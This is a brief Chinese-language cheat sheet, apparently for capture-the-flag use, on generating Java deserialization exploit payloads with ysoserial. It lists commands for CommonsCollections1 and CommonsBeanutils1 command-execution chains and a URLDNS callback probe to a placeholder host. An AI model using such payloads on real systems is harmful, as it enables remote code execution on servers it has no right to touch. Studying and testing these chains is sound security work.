# ysoserial Java 常用用法

ysoserial 适合 Java 反序列化 payload 生成。常用参数：gadget 名称和命令。

```bash
java -jar ysoserial.jar
```

```bash
java -jar ysoserial.jar CommonsCollections1 "id" > payload.bin
```

```bash
java -jar ysoserial.jar URLDNS "http://example.dnslog" > dns.bin
```

```bash
java -jar ysoserial.jar CommonsBeanutils1 "whoami" | base64 -w0
```

小记录：ysoserial 要和依赖版本匹配。比赛里常先用 URLDNS 验证触发，再考虑更重的链。
